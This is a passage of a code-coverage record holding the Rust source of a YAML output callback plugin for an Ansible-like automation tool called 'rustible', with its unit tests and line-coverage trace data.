show;\n        self\n    }\n\n    /// Enable or disable warnings display.\n    pub fn show_warnings(mut self, show: bool) -\u003e Self {\n        self.config.show_warnings = show;\n        self\n    }\n\n    /// Set verbosity level.\n    pub fn verbosity(mut self, level: u8) -\u003e Self {\n        self.config.verbosity = level;\n        self\n    }\n\n    /// Build the YamlConfig.\n    pub fn build(self) -\u003e YamlConfig {\n        self.config\n    }\n}\n\n// ============================================================================\n// Host Statistics\n// ============================================================================\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n    /// Count of unreachable attempts\n    unreachable: u32,\n}\n\n// ============================================================================\n// YAML Callback Plugin\n// ============================================================================\n\n/// YAML callback plugin for human-readable, machine-parseable output.\n///\n/// This plugin outputs all execution events in YAML format, making it easy\n/// to both read and parse programmatically. The output is structured with\n/// proper indentation and includes all relevant execution details.\n///\n/// ## Key Features\n///\n/// - **Structured Output**: Proper YAML document structure with nested elements\n/// - **Colorized Status**: Status indicators are colored for easy scanning\n/// - **Duration Tracking**: Shows execution time for tasks and playbooks\n/// - **Diff Support**: Shows before/after for changed resources\n/// - **Command Output**: Includes stdout/stderr for shell commands\n///\n/// ## Thread Safety\n///\n/// The callback uses `RwLock` internally for state management, making it\n/// safe to use across multiple threads during parallel task execution.\n///\n/// ## Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::{YamlCallback, YamlConfig};\n///\n/// // With default settings\n/// let callback = YamlCallback::new();\n///\n/// // With custom settings\n/// let config = YamlConfig::builder()\n///     .use_color(false)\n///     .indent_size(4)\n///     .build();\n/// let callback = YamlCallback::with_config(config);\n/// ```\npub struct YamlCallback {\n    /// Plugin configuration\n    config: YamlConfig,\n    /// Per-host execution statistics\n    host_stats: RwLock\u003cHashMap\u003cString, HostStats\u003e\u003e,\n    /// Playbook start time for duration tracking\n    start_time: RwLock\u003cOption\u003cInstant\u003e\u003e,\n    /// Current indentation level\n    indent_level: RwLock\u003cusize\u003e,\n    /// Current playbook name\n    current_playbook: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Whether we're in the tasks section\n    in_tasks_section: RwLock\u003cbool\u003e,\n}\n\nimpl fmt::Debug for YamlCallback {\n    fn fmt(\u0026self, f: \u0026mut fmt::Formatter\u003c'_\u003e) -\u003e fmt::Result {\n        f.debug_struct(\"YamlCallback\")\n            .field(\"config\", \u0026self.config)\n            .field(\"current_playbook\", \u0026*self.current_playbook.read())\n            .finish()\n    }\n}\n\nimpl YamlCallback {\n    /// Create a new YAML callback plugin with default settings.\n    pub fn new() -\u003e Self {\n        Self::with_config(YamlConfig::default())\n    }\n\n    /// Create a new YAML callback plugin with custom configuration.\n    pub fn with_config(config: YamlConfig) -\u003e Self {\n        Self {\n            config,\n            host_stats: RwLock::new(HashMap::new()),\n            start_time: RwLock::new(None),\n            indent_level: RwLock::new(0),\n            current_playbook: RwLock::new(None),\n            in_tasks_section: RwLock::new(false),\n        }\n    }\n\n    /// Create a YAML callback with colors disabled.\n    pub fn without_colors() -\u003e Self {\n        let config = YamlConfig {\n            use_color: false,\n            ..Default::default()\n        };\n        Self::with_config(config)\n    }\n\n    // ========================================================================\n    // Indentation Helpers\n    // ========================================================================\n\n    /// Get the current indentation string.\n    fn indent(\u0026self) -\u003e String {\n        let level = *self.indent_level.read();\n        \" \".repeat(level * self.config.indent_size)\n    }\n\n    /// Increase indentation level.\n    fn push_indent(\u0026self) {\n        let mut level = self.indent_level.write();\n        *level += 1;\n    }\n\n    /// Decrease indentation level.\n    fn pop_indent(\u0026self) {\n        let mut level = self.indent_level.write();\n        if *level \u003e 0 {\n            *level -= 1;\n        }\n    }\n\n    /// Reset indentation to zero.\n    fn reset_indent(\u0026self) {\n        let mut level = self.indent_level.write();\n        *level = 0;\n    }\n\n    // ========================================================================\n    // Formatting Helpers\n    // ========================================================================\n\n    /// Format a duration as a human-readable string.\n    fn format_duration(\u0026self, duration: Duration) -\u003e String {\n        let secs = duration.as_secs_f64();\n        if secs \u003c 0.001 {\n            format!(\"{:.0}us\", duration.as_micros())\n        } else if secs \u003c 1.0 {\n            format!(\"{:.0}ms\", duration.as_millis())\n        } else if secs \u003c 60.0 {\n            format!(\"{:.2}s\", secs)\n        } else if secs \u003c 3600.0 {\n            let mins = (secs / 60.0).floor();\n            let remaining_secs = secs % 60.0;\n            format!(\"{:.0}m {:.0}s\", mins, remaining_secs)\n        } else {\n            let hours = (secs / 3600.0).floor();\n            let remaining_mins = ((secs % 3600.0) / 60.0).floor();\n            format!(\"{:.0}h {:.0}m\", hours, remaining_mins)\n        }\n    }\n\n    /// Format a status with optional color.\n    fn format_status(\u0026self, success: bool, changed: bool, skipped: bool) -\u003e String {\n        let status_str = if skipped {\n            \"skipped\"\n        } else if !success {\n            \"failed\"\n        } else if changed {\n            \"changed\"\n        } else {\n            \"ok\"\n        };\n\n        if self.config.use_color {\n            match status_str {\n                \"skipped\" =\u003e status_str.cyan().to_string(),\n                \"failed\" =\u003e status_str.red().bold().to_string(),\n                \"changed\" =\u003e status_str.yellow().to_string(),\n                _ =\u003e status_str.green().to_string(),\n            }\n        } else {\n            status_str.to_string()\n        }\n    }\n\n    /// Escape a string for YAML output.\n    fn yaml_escape(\u0026self, s: \u0026str) -\u003e String {\n        // Check if we need quoting\n        let needs_quoting = s.is_empty()\n            || s.contains(':')\n            || s.contains('#')\n            || s.contains('\\n')\n            || s.contains('\\r')\n            || s.contains('\\t')\n            || s.starts_with(' ')\n            || s.ends_with(' ')\n            || s.starts_with('\\'')\n            || s.starts_with('\"')\n            || s.starts_with('[')\n            || s.starts_with('{')\n            || s.starts_with('\u0026')\n            || s.starts_with('*')\n            || s.starts_with('!')\n            || s.starts_with('|')\n            || s.starts_with('\u003e')\n            || s.starts_with('%')\n            || s.starts_with('@')\n            || s.starts_with('`')\n            || s == \"true\"\n            || s == \"false\"\n            || s == \"null\"\n            || s == \"~\"\n            || s.parse::\u003cf64\u003e().is_ok();\n\n        if needs_quoting {\n            // Use double quotes and escape special chars\n            let escaped = s\n                .replace('\\\\', \"\\\\\\\\\")\n                .replace('\"', \"\\\\\\\"\")\n                .replace('\\n', \"\\\\n\")\n                .replace('\\r', \"\\\\r\")\n                .replace('\\t', \"\\\\t\");\n            format!(\"\\\"{}\\\"\", escaped)\n        } else {\n            s.to_string()\n        }\n    }\n\n    /// Format a multiline string as a YAML literal block.\n    fn format_multiline(\u0026self, s: \u0026str, base_indent: \u0026str) -\u003e String {\n        if !s.contains('\\n') {\n            return self.yaml_escape(s);\n        }\n\n        let mut result = String::from(\"|\\n\");\n        for line in s.lines() {\n            result.push_str(base_indent);\n            result.push_str(\"  \");\n            result.push_str(line);\n            result.push('\\n');\n        }\n        // Remove trailing newline\n        result.pop();\n        result\n    }\n\n    /// Truncate output if it exceeds max lines.\n    #[allow(dead_code)]\n    fn truncate_output(\u0026self, output: \u0026str) -\u003e String {\n        if self.config.max_output_lines == 0 {\n            return output.to_string();\n        }\n\n        let lines: Vec\u003c\u0026str\u003e = output.lines().collect();\n        if lines.len() \u003c= self.config.max_output_lines {\n            return output.to_string();\n        }\n\n        let half = self.config.max_output_lines / 2;\n        let mut result = String::new();\n\n        for line in lines.iter().take(half) {\n            result.push_str(line);\n            result.push('\\n');\n        }\n\n        result.push_str(\u0026format!(\n            \"... ({} lines omitted) ...\\n\",\n            lines.len() - self.config.max_output_lines\n        ));\n\n        for line in lines.iter().skip(lines.len() - half) {\n            result.push_str(line);\n            result.push('\\n');\n        }\n\n        result\n    }\n\n    // ========================================================================\n    // Output Helpers\n    // ========================================================================\n\n    /// Output a YAML key-value pair.\n    fn output_kv(\u0026self, key: \u0026str, value: \u0026str) {\n        let indent = self.indent();\n        println!(\"{}{}: {}\", indent, key, value);\n    }\n\n    /// Output a YAML key with a literal value (no escaping).\n    fn output_kv_literal(\u0026self, key: \u0026str, value: \u0026str) {\n        let indent = self.indent();\n        println!(\"{}{}: {}\", indent, key, value);\n    }\n\n    /// Output a YAML list item.\n    fn output_list_item(\u0026self, value: \u0026str) {\n        let indent = self.indent();\n        println!(\"{}- {}\", indent, value);\n    }\n\n    /// Output the start of a YAML list item object.\n    fn output_list_item_key(\u0026self, key: \u0026str, value: \u0026str) {\n        let indent = self.indent();\n        println!(\"{}- {}: {}\", indent, key, value);\n    }\n\n    /// Output a JSON value as YAML.\n    fn output_json_value(\u0026self, key: \u0026str, value: \u0026serde_json::Value) {\n        let indent = self.indent();\n\n        match value {\n            serde_json::Value::Null =\u003e {\n                if self.config.show_empty_values {\n                    println!(\"{}{}: null\", indent, key);\n                }\n            }\n            serde_json::Value::Bool(b) =\u003e {\n                println!(\"{}{}: {}\", indent, key, b);\n            }\n            serde_json::Value::Number(n) =\u003e {\n                println!(\"{}{}: {}\", indent, key, n);\n            }\n            serde_json::Value::String(s) =\u003e {\n                if s.is_empty() \u0026\u0026 !self.config.show_empty_values {\n                    return;\n                }\n                if s.contains('\\n') {\n                    println!(\"{}{}: {}\", indent, key, self.format_multiline(s, \u0026indent));\n                } else {\n                    println!(\"{}{}: {}\", indent, key, self.yaml_escape(s));\n                }\n            }\n            serde_json::Value::Array(arr) =\u003e {\n                if arr.is_empty() \u0026\u0026 !self.config.show_empty_values {\n                    return;\n                }\n                println!(\"{}{}:\", indent, key);\n                self.push_indent();\n                for item in arr {\n                    self.output_json_array_item(item);\n                }\n                self.pop_indent();\n            }\n            serde_json::Value::Object(obj) =\u003e {\n                if obj.is_empty() \u0026\u0026 !self.config.show_empty_values {\n                    return;\n                }\n                println!(\"{}{}:\", indent, key);\n                self.push_indent();\n                for (k, v) in obj {\n                    self.output_json_value(k, v);\n                }\n                self.pop_indent();\n            }\n        }\n    }\n\n    /// Output a JSON array item.\n    fn output_json_array_item(\u0026self, value: \u0026serde_json::Value) {\n        let indent = self.indent();\n\n        match value {\n            serde_json::Value::Null =\u003e {\n                println!(\"{}- null\", indent);\n            }\n            serde_json::Value::Bool(b) =\u003e {\n                println!(\"{}- {}\", indent, b);\n            }\n            serde_json::Value::Number(n) =\u003e {\n                println!(\"{}- {}\", indent, n);\n            }\n            serde_json::Value::String(s) =\u003e {\n                println!(\"{}- {}\", indent, self.yaml_escape(s));\n            }\n            serde_json::Value::Array(arr) =\u003e {\n                println!(\"{}-\", indent);\n                self.push_indent();\n                for item in arr {\n                    self.output_json_array_item(item);\n                }\n                self.pop_indent();\n            }\n            serde_json::Value::Object(obj) =\u003e {\n                let mut first = true;\n                for (k, v) in obj {\n                    if first {\n                        // First item uses list marker\n                        print!(\"{}- \", indent);\n                        self.output_inline_kv(k, v);\n                        first = false;\n                    } else {\n                        // Subsequent items are indented\n                        print!(\"{}  \", indent);\n                        self.output_inline_kv(k, v);\n                    }\n                }\n            }\n        }\n    }\n\n    /// Output an inline key-value (without indent prefix).\n    fn output_inline_kv(\u0026self, key: \u0026str, value: \u0026serde_json::Value) {\n        match value {\n            serde_json::Value::Null =\u003e {\n                println!(\"{}: null\", key);\n            }\n            serde_json::Value::Bool(b) =\u003e {\n                println!(\"{}: {}\", key, b);\n            }\n            serde_json::Value::Number(n) =\u003e {\n                println!(\"{}: {}\", key, n);\n            }\n            serde_json::Value::String(s) =\u003e {\n                println!(\"{}: {}\", key, self.yaml_escape(s));\n            }\n            _ =\u003e {\n                // For complex types, serialize to JSON string\n                println!(\n                    \"{}: {}\",\n                    key,\n                    serde_json::to_string(value).unwrap_or_default()\n                );\n            }\n        }\n    }\n}\n\nimpl Default for YamlCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n// ============================================================================\n// ExecutionCallback Implementation\n// ============================================================================\n\n#[async_trait]\nimpl ExecutionCallback for YamlCallback {\n    /// Called when a playbook starts.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        self.reset_indent();\n\n        // Store start time and playbook name\n        *self.start_time.write() = Some(Instant::now());\n        *self.current_playbook.write() = Some(name.to_string());\n\n        // Clear stats from any previous run\n        self.host_stats.write().clear();\n\n        // YAML document start\n        println!(\"---\");\n        self.output_kv(\"playbook\", \u0026self.yaml_escape(name));\n        println!(\"{}plays:\", self.indent());\n    }\n\n    /// Called when a playbook ends.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let start_time = *self.start_time.read();\n        let duration = start_time.map(|s| s.elapsed()).unwrap_or_default();\n\n        // Close any open sections\n        *self.in_tasks_section.write() = false;\n\n        // Output summary\n        println!();\n        println!(\"---\");\n        println!(\"summary:\");\n        self.push_indent();\n\n        self.output_kv(\"playbook\", \u0026self.yaml_escape(name));\n        self.output_kv_literal(\"duration\", \u0026self.format_duration(duration));\n\n        let status = if success { \"success\" } else { \"failed\" };\n        let status_str = if self.config.use_color {\n            if success {\n                status.green().to_string()\n            } else {\n                status.red().bold().to_string()\n            }\n        } else {\n            status.to_string()\n        };\n        self.output_kv_literal(\"status\", \u0026status_str);\n\n        // Output per-host stats\n        let stats = self.host_stats.read();\n        if !stats.is_empty() {\n            println!(\"{}hosts:\", self.indent());\n            self.push_indent();\n\n            let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n            hosts.sort();\n\n            for host in hosts {\n                if let Some(host_stats) = stats.get(host) {\n                    self.output_list_item_key(\"host\", \u0026self.yaml_escape(host));\n                    self.push_indent();\n\n                    // Use colored status summary\n                    let ok_str = if self.config.use_color {\n                        host_stats.ok.to_string().green().to_string()\n                    } else {\n                        host_stats.ok.to_string()\n                    };\n                    let changed_str = if self.config.use_color {\n                        host_stats.changed.to_string().yellow().to_string()\n                    } else {\n                        host_stats.changed.to_string()\n                    };\n                    let failed_str = if self.config.use_color {\n                        host_stats.failed.to_string().red().to_string()\n                    } else {\n                        host_stats.failed.to_string()\n                    };\n                    let skipped_str = if self.config.use_color {\n                        host_stats.skipped.to_string().cyan().to_string()\n                    } else {\n                        host_stats.skipped.to_string()\n                    };\n\n                    self.output_kv_literal(\"ok\", \u0026ok_str);\n                    self.output_kv_literal(\"changed\", \u0026changed_str);\n                    self.output_kv_literal(\"failed\", \u0026failed_str);\n                    self.output_kv_literal(\"skipped\", \u0026skipped_str);\n\n                    if host_stats.unreachable \u003e 0 {\n                        let unreachable_str = if self.config.use_color {\n                            host_stats.unreachable.to_string().magenta().to_string()\n                        } else {\n                            host_stats.unreachable.to_string()\n                        };\n                        self.output_kv_literal(\"unreachable\", \u0026unreachable_str);\n                    }\n\n                    self.pop_indent();\n                }\n            }\n\n            self.pop_indent();\n        }\n\n        self.pop_indent();\n\n        // YAML document end\n        println!(\"...\");\n\n        // Flush output\n        let _ = io::stdout().flush();\n    }\n\n    /// Called when a play starts.\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        self.push_indent();\n\n        self.output_list_item_key(\"name\", \u0026self.yaml_escape(name));\n        self.push_indent();\n\n        // Output hosts list\n        println!(\"{}hosts:\", self.indent());\n        self.push_indent();\n        for host in hosts {\n            self.output_list_item(\u0026self.yaml_escape(host));\n            // Initialize host stats\n            self.host_stats.write().entry(host.clone()).or_default();\n        }\n        self.pop_indent();\n\n        // Start tasks section\n        println!(\"{}tasks:\", self.indent());\n        *self.in_tasks_section.write() = true;\n    }\n\n    /// Called when a play ends.\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        *self.in_tasks_section.write() = false;\n        self.pop_indent();\n        self.pop_indent();\n    }\n\n    /// Called when a task starts.\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // We output task info with results, not on start\n        // This provides better grouping in the output\n    }\n\n    /// Called when a task completes.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Update statistics\n        {\n            let mut stats = self.host_stats.write();\n            let host_stats = stats.entry(result.host.clone()).or_default();\n\n            if result.result.skipped {\n                host_stats.skipped += 1;\n            } else if !result.result.success {\n                host_stats.failed += 1;\n            } else if result.result.changed {\n                host_stats.changed += 1;\n            } else {\n                host_stats.ok += 1;\n            }\n        }\n\n        // Output task result\n        self.push_indent();\n\n        self.output_list_item_key(\"task\", \u0026self.yaml_escape(\u0026result.task_name));\n        self.push_indent();\n\n        self.output_kv(\"host\", \u0026self.yaml_escape(\u0026result.host));\n\n        let status = self.format_status(\n            result.result.success,\n            result.result.changed,\n            result.result.skipped,\n        );\n        self.output_kv_literal(\"status\", \u0026status);\n        self.output_kv_literal(\"changed\", \u0026result.result.changed.to_string());\n\n        // Message\n        if !result.result.message.is_empty() {\n            let indent = self.indent();\n            if result.result.message.contains('\\n') {\n                println!(\n                    \"{}msg: {}\",\n                    indent,\n                    self.format_multiline(\u0026result.result.message, \u0026indent)\n                );\n            } else {\n                self.output_kv(\"msg\", \u0026self.yaml_escape(\u0026result.result.message));\n            }\n        }\n\n        // Duration\n        if self.config.show_duration {\n            self.output_kv_literal(\"duration\", \u0026self.format_duration(result.duration));\n        }\n\n        // Warnings\n        if self.config.show_warnings \u0026\u0026 !result.result.warnings.is_empty() {\n            println!(\"{}warnings:\", self.indent());\n            self.push_indent();\n            for warning in \u0026result.result.warnings {\n                let warning_str = if self.config.use_color {\n                    self.yaml_escape(warning).yellow().to_string()\n                } else {\n                    self.yaml_escape(warning)\n                };\n                self.output_list_item(\u0026warning_str);\n            }\n            self.pop_indent();\n        }\n\n        // Result data\n        if self.config.show_result_data {\n            if let Some(ref data) = result.result.data {\n                if !data.is_null() \u0026\u0026 data != \u0026serde_json::Value::Object(serde_json::Map::new()) {\n                    self.output_json_value(\"result\", data);\n                }\n            }\n        }\n\n        self.pop_indent();\n        self.pop_indent();\n    }\n\n    /// Called when a handler is triggered.\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        let indent = self.indent();\n        if self.config.use_color {\n            println!(\n                \"{}# Handler triggered: {}\",\n                indent,\n                name.bright_blue().to_string()\n            );\n        } else {\n            println!(\"{}# Handler triggered: {}\", indent, name);\n        }\n    }\n\n    /// Called when facts are gathered.\n    async fn on_facts_gathered(\u0026self, host: \u0026str, _facts: \u0026Facts) {\n        let indent = self.indent();\n        if self.config.use_color {\n            println!(\n                \"{}# Facts gathered for: {}\",\n                indent,\n                host.bright_green().to_string()\n            );\n        } else {\n            println!(\"{}# Facts gathered for: {}\", indent, host);\n        }\n    }\n}\n\n// ============================================================================\n// Unit Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n\n    #[test]\n    fn test_yaml_callback_creation() {\n        let callback = YamlCallback::new();\n        assert!(callback.config.use_color);\n        assert_eq!(callback.config.indent_size, 2);\n    }\n\n    #[test]\n    fn test_yaml_callback_without_colors() {\n        let callback = YamlCallback::without_colors();\n        assert!(!callback.config.use_color);\n    }\n\n    #[test]\n    fn test_yaml_config_builder() {\n        let config = YamlConfig::builder()\n            .use_color(false)\n            .indent_size(4)\n            .show_duration(false)\n            .show_result_data(true)\n            .max_output_lines(100)\n            .verbosity(2)\n            .build();\n\n        assert!(!config.use_color);\n        assert_eq!(config.indent_size, 4);\n        assert!(!config.show_duration);\n        assert!(config.show_result_data);\n        assert_eq!(config.max_output_lines, 100);\n        assert_eq!(config.verbosity, 2);\n    }\n\n    #[test]\n    fn test_yaml_escape() {\n        let callback = YamlCallback::new();\n\n        // Simple strings don't need escaping\n        assert_eq!(callback.yaml_escape(\"hello\"), \"hello\");\n\n        // Strings with colons need quoting\n        assert_eq!(callback.yaml_escape(\"key: value\"), \"\\\"key: value\\\"\");\n\n        // Strings with newlines need quoting\n        assert_eq!(callback.yaml_escape(\"line1\\nline2\"), \"\\\"line1\\\\nline2\\\"\");\n\n        // Reserved words need quoting\n        assert_eq!(callback.yaml_escape(\"true\"), \"\\\"true\\\"\");\n        assert_eq!(callback.yaml_escape(\"false\"), \"\\\"false\\\"\");\n        assert_eq!(callback.yaml_escape(\"null\"), \"\\\"null\\\"\");\n\n        // Numbers need quoting\n        assert_eq!(callback.yaml_escape(\"123\"), \"\\\"123\\\"\");\n        assert_eq!(callback.yaml_escape(\"3.14\"), \"\\\"3.14\\\"\");\n    }\n\n    #[test]\n    fn test_format_duration() {\n        let callback = YamlCallback::new();\n\n        // Microseconds\n        assert_eq!(\n            callback.format_duration(Duration::from_micros(500)),\n            \"500us\"\n        );\n\n        // Milliseconds\n        assert_eq!(\n            callback.format_duration(Duration::from_millis(100)),\n            \"100ms\"\n        );\n\n        // Seconds\n        assert!(callback\n            .format_duration(Duration::from_secs(5))\n            .contains(\"5.00s\"));\n\n        // Minutes\n        let dur = callback.format_duration(Duration::from_secs(125));\n        assert!(dur.contains(\"2m\") \u0026\u0026 dur.contains(\"5s\"));\n\n        // Hours\n        let dur = callback.format_duration(Duration::from_secs(3700));\n        assert!(dur.contains(\"1h\") \u0026\u0026 dur.contains(\"1m\"));\n    }\n\n    #[test]\n    fn test_format_status() {\n        let callback = YamlCallback::without_colors();\n\n        assert_eq!(callback.format_status(true, false, false), \"ok\");\n        assert_eq!(callback.format_status(true, true, false), \"changed\");\n        assert_eq!(callback.format_status(false, false, false), \"failed\");\n        assert_eq!(callback.format_status(true, false, true), \"skipped\");\n    }\n\n    #[test]\n    fn test_truncate_output() {\n        let config = YamlConfig {\n            max_output_lines: 4,\n            ..Default::default()\n        };\n        let callback = YamlCallback::with_config(config);\n\n        let long_output = \"line1\\nline2\\nline3\\nline4\\nline5\\nline6\\nline7\\nline8\";\n        let truncated = callback.truncate_output(long_output);\n\n        assert!(truncated.contains(\"line1\"));\n        assert!(truncated.contains(\"line2\"));\n        assert!(truncated.contains(\"omitted\"));\n        assert!(truncated.contains(\"line7\"));\n        assert!(truncated.contains(\"line8\"));\n    }\n\n    #[test]\n    fn test_indentation() {\n        let callback = YamlCallback::new();\n\n        assert_eq!(callback.indent(), \"\");\n\n        callback.push_indent();\n        assert_eq!(callback.indent(), \"  \");\n\n        callback.push_indent();\n        assert_eq!(callback.indent(), \"    \");\n\n        callback.pop_indent();\n        assert_eq!(callback.indent(), \"  \");\n\n        callback.reset_indent();\n        assert_eq!(callback.indent(), \"\");\n    }\n\n    #[test]\n    fn test_multiline_format() {\n        let callback = YamlCallback::new();\n\n        // Single line should not use block format\n        let single = callback.format_multiline(\"single line\", \"\");\n        assert!(!single.starts_with('|'));\n\n        // Multi line should use block format\n        let multi = callback.format_multiline(\"line1\\nline2\\nline3\", \"\");\n        assert!(multi.starts_with('|'));\n        assert!(multi.contains(\"line1\"));\n        assert!(multi.contains(\"line2\"));\n        assert!(multi.contains(\"line3\"));\n    }\n\n    #[tokio::test]\n    async fn test_host_stats_tracking() {\n        let callback = YamlCallback::without_colors();\n\n        callback.on_playbook_start(\"test.yml\").await;\n        callback.on_play_start(\"test\", \u0026[\"host1\".to_string()]).await;\n\n        // Simulate task completions\n        let ok_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task1\".to_string(),\n            result: ModuleResult::ok(\"Success\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task2\".to_string(),\n            result: ModuleResult::changed(\"Changed\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026changed_result).await;\n\n        let failed_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task3\".to_string(),\n            result: ModuleResult::failed(\"Failed\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026failed_result).await;\n\n        // Check stats\n        let stats = callback.host_stats.read();\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 1);\n        assert_eq!(host1_stats.failed, 1);\n    }\n\n    #[test]\n    fn test_default_trait() {\n        let callback = YamlCallback::default();\n        assert!(callback.config.use_color);\n    }\n\n    #[test]\n    fn test_debug_trait() {\n        let callback = YamlCallback::new();\n        let debug_str = format!(\"{:?}\", callback);\n        assert!(debug_str.contains(\"YamlCallback\"));\n    }\n}\n","traces":[{"line":100,"address":[30090752],"length":1,"stats":{"Line":1}},{"line":118,"address":[30090912],"length":1,"stats":{"Line":1}},{"line":119,"address":[30090920],"length":1,"stats":{"Line":1}},{"line":131,"address":[30105904],"length":1,"stats":{"Line":0}},{"line":132,"address":[30105912],"length":1,"stats":{"Line":0}},{"line":136,"address":[30106016],"length":1,"stats":{"Line":1}},{"line":137,"address":[30106030],"length":1,"stats":{"Line":1}},{"line":138,"address":[30106036],"length":1,"stats":{"Line":1}},{"line":142,"address":[30105568],"length":1,"stats":{"Line":1}},{"line":143,"address":[30105576],"length":1,"stats":{"Line":1}},{"line":144,"address":[30105579],"length":1,"stats":{"Line":1}},{"line":148,"address":[30105616],"length":1,"stats":{"Line":1}},{"line":149,"address":[30105630],"length":1,"stats":{"Line":1}},{"line":150,"address":[30105636],"length":1,"stats":{"Line":1}},{"line":154,"address":[30105760],"length":1,"stats":{"Line":1}},{"line":155,"address":[30105774],"length":1,"stats":{"Line":1}},{"line":156,"address":[30105780],"length":1,"stats":{"Line":1}},{"line":160,"address":[30105968],"length":1,"stats":{"Line":0}},{"line":161,"address":[30105982],"length":1,"stats":{"Line":0}},{"line":162,"address":[30105988],"length":1,"stats":{"Line":0}},{"line":166,"address":[30105856],"length":1,"stats":{"Line":0}},{"line":167,"address":[30105870],"length":1,"stats":{"Line":0}},{"line":168,"address":[30105876],"length":1,"stats":{"Line":0}},{"line":172,"address":[30105712],"length":1,"stats":{"Line":1}},{"line":173,"address":[30105720],"length":1,"stats":{"Line":1}},{"line":174,"address":[30105724],"length":1,"stats":{"Line":1}},{"line":178,"address":[30105808],"length":1,"stats":{"Line":0}},{"line":179,"address":[30105822],"length":1,"stats":{"Line":0}},{"line":180,"address":[30105828],"length":1,"stats":{"Line":0}},{"line":184,"address":[30105664],"length":1,"stats":{"Line":0}},{"line":185,"address":[30105678],"length":1,"stats":{"Line":0}},{"line":186,"address":[30105684],"length":1,"stats":{"Line":0}},{"line":190,"address":[30106064],"length":1,"stats":{"Line":1}},{"line":191,"address":[30106073],"length":1,"stats":{"Line":1}},{"line":192,"address":[30106076],"length":1,"stats":{"Line":1}},{"line":196,"address":[30105936],"length":1,"stats":{"Line":1}},{"line":197,"address":[30105939],"length":1,"stats":{"Line":1}},{"line":274,"address":[30090499,30090493,30090240],"length":1,"stats":{"Line":1}},{"line":275,"address":[30090259],"length":1,"stats":{"Line":1}},{"line":276,"address":[30090300],"length":1,"stats":{"Line":1}},{"line":277,"address":[30090417,30090345],"length":1,"stats":{"Line":2}},{"line":284,"address":[30104928],"length":1,"stats":{"Line":1}},{"line":285,"address":[30104941],"length":1,"stats":{"Line":1}},{"line":289,"address":[30091360,30091804],"length":1,"stats":{"Line":1}},{"line":292,"address":[30091391],"length":1,"stats":{"Line":1}},{"line":293,"address":[30091424],"length":1,"stats":{"Line":1}},{"line":294,"address":[30091468],"length":1,"stats":{"Line":1}},{"line":295,"address":[30091501],"length":1,"stats":{"Line":1}},{"line":296,"address":[30091542],"length":1,"stats":{"Line":1}},{"line":301,"address":[30094560],"length":1,"stats":{"Line":1}},{"line":306,"address":[30094682],"length":1,"stats":{"Line":1}},{"line":314,"address":[30105190,30104976,30105196],"length":1,"stats":{"Line":1}},{"line":315,"address":[30105008],"length":1,"stats":{"Line":1}},{"line":316,"address":[30105123,30105177],"length":1,"stats":{"Line":1}},{"line":320,"address":[30091335,30091168,30091329],"length":1,"stats":{"Line":1}},{"line":321,"address":[30091177],"length":1,"stats":{"Line":1}},{"line":322,"address":[30091260,30091202,30091309],"length":1,"stats":{"Line":2}},{"line":326,"address":[30090944,30091137,30091143],"length":1,"stats":{"Line":1}},{"line":327,"address":[30090953],"length":1,"stats":{"Line":1}},{"line":328,"address":[30090983,30091035,30091115],"length":1,"stats":{"Line":3}},{"line":329,"address":[30091057,30091117],"length":1,"stats":{"Line":1}},{"line":334,"address":[30093536,30093649,30093655],"length":1,"stats":{"Line":1}},{"line":335,"address":[30093545],"length":1,"stats":{"Line":1}},{"line":336,"address":[30093626,30093570],"length":1,"stats":{"Line":2}},{"line":344,"address":[30094704],"length":1,"stats":{"Line":1}},{"line":345,"address":[30094738],"length":1,"stats":{"Line":1}},{"line":346,"address":[30094754],"length":1,"stats":{"Line":1}},{"line":347,"address":[30094800],"length":1,"stats":{"Line":1}},{"line":348,"address":[30094770],"length":1,"stats":{"Line":1}},{"line":349,"address":[30095008],"length":1,"stats":{"Line":1}},{"line":350,"address":[30094978],"length":1,"stats":{"Line":1}},{"line":351,"address":[30095223],"length":1,"stats":{"Line":1}},{"line":352,"address":[30095198],"length":1,"stats":{"Line":1}},{"line":353,"address":[30095710],"length":1,"stats":{"Line":1}},{"line":354,"address":[30095754],"length":1,"stats":{"Line":1}},{"line":355,"address":[30095778],"length":1,"stats":{"Line":1}},{"line":357,"address":[30095386],"length":1,"stats":{"Line":1}},{"line":358,"address":[30095430],"length":1,"stats":{"Line":1}},{"line":359,"address":[30095471],"length":1,"stats":{"Line":1}},{"line":364,"address":[30093680,30094359,30094353],"length":1,"stats":{"Line":1}},{"line":365,"address":[30093788,30093843,30093753],"length":1,"stats":{"Line":3}},{"line":366,"address":[30093767],"length":1,"stats":{"Line":1}},{"line":367,"address":[30093909,30093761,30093823,30093811],"length":1,"stats":{"Line":4}},{"line":368,"address":[30093790],"length":1,"stats":{"Line":1}},{"line":369,"address":[30093866,30093889,30093817],"length":1,"stats":{"Line":3}},{"line":370,"address":[30093868],"length":1,"stats":{"Line":1}},{"l